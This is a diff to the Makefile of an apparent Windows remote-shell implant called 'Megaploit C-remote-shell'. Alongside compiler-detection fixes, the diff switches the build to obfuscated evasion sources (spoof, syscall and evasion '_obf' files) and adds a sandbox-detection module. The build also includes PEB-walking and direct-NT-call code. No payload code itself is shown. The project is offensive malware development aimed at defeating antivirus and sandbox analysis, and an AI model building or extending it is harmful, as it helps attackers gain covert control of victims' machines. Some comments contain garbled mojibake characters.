@@ -1,5 +1,9 @@
+# Set the default goal explicitly so it is always 'all' regardless of
+# which conditional branch defines targets first.
+.DEFAULT_GOAL := all
+
 # ============================================================================
-# C-remote-shell â€” Makefile
+# C-remote-shell â€" Makefile
 # ============================================================================
 # Builds the Megaploit C-remote-shell Windows EXE client using MSVC or MinGW.
 #
@@ -40,14 +44,20 @@
 CC_MSVC   := cl
 CC_MINGW  := x86_64-w64-mingw32-gcc
 
-MSVC_OK   := $(shell $(CC_MSVC) 2>NUL; echo $$?)
+# Prefer the MSYS2 UCRT64 native gcc (just "gcc") when running inside MSYS2.
+# Fall back to the MinGW cross-compiler for Linux/macOS cross-builds.
+# MSVC detection uses which/where so it works in both bash and cmd.
+MSVC_OK   := $(shell which cl 2>/dev/null)
+MINGW_UCRT_OK := $(wildcard C:/msys64/ucrt64/bin/gcc.exe)
 MINGW_OK  := $(shell which $(CC_MINGW) 2>/dev/null)
 
 ifeq ($(CC),)
-  ifneq ($(MSVC_OK),)
-    CC := $(CC_MSVC)
+  ifneq ($(MINGW_UCRT_OK),)
+    CC := C:/msys64/ucrt64/bin/gcc.exe
   else ifneq ($(MINGW_OK),)
     CC := $(CC_MINGW)
+  else ifneq ($(MSVC_OK),)
+    CC := $(CC_MSVC)
   else
     $(error No C compiler found. Install MSVC (Developer Command Prompt) or MinGW (apt install mingw-w64))
   endif
@@ -148,10 +158,11 @@ endif
 
 # Refactored client/ build (preferred)
 CLIENT_SRCS := client/core/main.c               \
-               client/evasion/spoof.c            \
+               client/evasion/spoof_obf.c        \
                client/evasion/peb_walk.c         \
-               client/evasion/syscall.c          \
-               client/evasion/evasion.c          \
+               client/evasion/syscall_obf.c      \
+               client/evasion/evasion_obf.c      \
+               client/evasion/sandbox.c          \
                client/core/ntcalls.c             \
                client/shell/shell.c              \
                client/shell/handlers_system.c    \
@@ -273,7 +284,9 @@ MINGW_LIBS    := -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -lshe
 # Detect MSVC vs MinGW
 # ---------------------------------------------------------------------------
 
-ifeq ($(CC),$(CC_MSVC))
+# If CC contains "gcc" or "mingw" it's a GCC-family compiler — use MinGW branch.
+# Only use MSVC branch when CC is literally "cl" or "cl.exe".
+ifneq (,$(filter cl cl.exe,$(notdir $(CC))))
   # â"€â"€ MSVC â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
   CLIENT_OUT := $(NAME).exe
   LEGACY_OUT := $(NAME)_legacy.exe
